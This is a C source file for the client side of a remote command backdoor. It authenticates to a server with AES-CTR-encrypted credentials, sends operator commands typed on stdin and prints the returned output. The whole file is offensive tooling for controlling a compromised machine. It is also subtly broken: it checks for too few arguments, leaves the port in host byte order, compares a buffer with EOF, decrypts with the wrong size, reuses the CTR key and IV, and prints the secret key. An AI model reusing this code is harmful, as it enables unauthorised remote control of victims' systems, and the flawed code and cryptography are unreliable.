#include "includes.h"

#define AES256 1

// argv[1] = server IP
// argv[2] = server port
// argv[3] = username
// argv[4] = password
// argv[5] = maximum number of server reconnect/command send retries

int main(int argc, char** argv) {
    // Establish an IPV4 socket file descriptor using TCP
    if (argc < 5) {
        printf("Usage: client <server IP> <server port> <username> <password> <number of retries allowed>\n");
        return -1;
    }
    int retries = atoi(argv[5]);
    // TCP
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    int port = atoi(argv[2]);
    char* ip =  argv[1];
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = port;
    struct in_addr sin_addr;
    sin_addr.s_addr = inet_addr(ip); 
    addr.sin_addr = sin_addr; 
    char server_out[OUTPUT_BUFFER] = {0};
    
    // AES
    struct AES_ctx ctx;
    
    char* key = (char*)malloc(64);
    char* iv = (char*)malloc(32);

    if ((read_key_file(key, iv) == -1)) {
        return -1;
    }
    printf("Read key: %s\nRead IV: %s\n", key, iv);
    int retried = 0;
    printf("retries: %d\n", retries);
    bool connected = false;
    while (retried <= retries) {
        if (!connected && connect(sockfd, &addr, sizeof(addr)) == -1) {
            printf("Connect failed! Are you running the server on port %d? Error: %s\nRetrying in 10 seconds.\n", port, strerror(errno));
            retried++;
            sleep(2);
            continue;
        } else {
            connected = true;
            char response[16];
            auth_with_server(argv, sockfd, ctx, key, iv, response);
            if (strcmp(response, "OK") != 0) {
                printf("Authentication failed! Either your symmetric key does not match the server, or your username/password is incorrect.\n");
                return -1;
            }
            printf("Welcome, %s.\n", argv[3]);
 

            while(retried <= retries) {
                char cmd[READ_LENGTH]; 
                fgets(cmd, READ_LENGTH, stdin);
                if (cmd != EOF) {
                    AES_init_ctx_iv(&ctx, key, iv);
                    AES_CTR_xcrypt_buffer (&ctx, cmd, READ_LENGTH);
                    bool cmd_written = false;
                    while (!cmd_written && retried <= retries) {
                        if (write(sockfd, cmd, READ_LENGTH) == -1) {
                            printf("Error while writing to the server.\nRetrying in 10 seconds.\n");
                            retried++;
                            sleep(2);
                            continue;
                        } else {
                            cmd_written = true;
                        }
                    }
                    if (!cmd_written) {
                        printf("Number of retries exceeded, unable to resolve the connection error.\n");
                        return -1;
                    }
                }
                // Read the potential command output from server
                char* server_out = (char*)calloc(sizeof(char), OUTPUT_BUFFER);
                
                if (read(sockfd, server_out, OUTPUT_BUFFER) < 0) {
                    printf("Error while reading from the server output buffer.\nRetrying in 10 seconds.\n");
                    retried++;
                    free(server_out);
                    sleep(10);
                    continue;
                }
                AES_init_ctx_iv(&ctx, key, iv);
                AES_CTR_xcrypt_buffer (&ctx, server_out, sizeof(server_out));

                // Display the server output to client console
                printf("%s", server_out);
                free(server_out);
            }
            printf("Number of retries exceeded, closing the connection. \n");
            close(sockfd);
        }
    }
    printf("Number of retries exceeded, unable to connect to the backdoor. Please ensure the configuration is valid.\n");
    return -1;
}


int read_key_file(char* key, char* iv) {
    int key_file = open("example_key", O_RDWR);
    char begin[3];
    read(key_file, begin, 3);
    if (strncmp(begin, "AES", 3) != 0) {
        printf("Error: invalid key file, aborting the read.\n");
        return -1;
    }
    lseek(key_file, 1, SEEK_CUR);
    read(key_file, key, 64);
    lseek(key_file, 5, SEEK_CUR);
    read(key_file, iv, 32);
    return 1;
}

void auth_with_server(char** argv, int sockfd, struct AES_ctx ctx, char* key, char* iv, char* response) {
    char uname[MAX_USERNAME_LEN];
    char pword[MAX_PASSWORD_LEN];
    
    strcpy(uname, argv[3]);
    strcpy(pword, argv[4]);

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer (&ctx, uname, sizeof(uname));     // Encrypt the username before sending
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer (&ctx, pword, sizeof(pword));     // Encrypt password

    // Authenticate with the server
    write(sockfd, uname, MAX_USERNAME_LEN);
    write(sockfd, pword, MAX_PASSWORD_LEN);

    // Expect a response of OK or INVALID
    read(sockfd, response, 16);

}